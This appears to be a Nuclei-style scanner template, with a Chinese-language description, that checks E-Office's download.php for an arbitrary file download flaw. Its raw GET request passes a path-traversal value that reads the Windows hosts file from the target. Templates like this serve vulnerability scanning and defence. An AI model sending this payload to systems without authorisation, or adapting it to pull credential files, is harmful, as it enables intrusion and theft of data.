id: E-Office-download-read
info:
  name: E-Office-download-read
  author: apple
  severity: high
  description: 该系统download.php存在任意文件下载漏洞，通过该漏洞攻击者可以下载服务上任意文件
  reference:
    - https://blog.csdn.net/CommputerMac/article/details/133961040
  tags: EOffice
http:
  - raw:
      - |+
        GET /general/file_folder/file_new/neworedit/download.php?filename=hosts&dir=C:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - Copyright
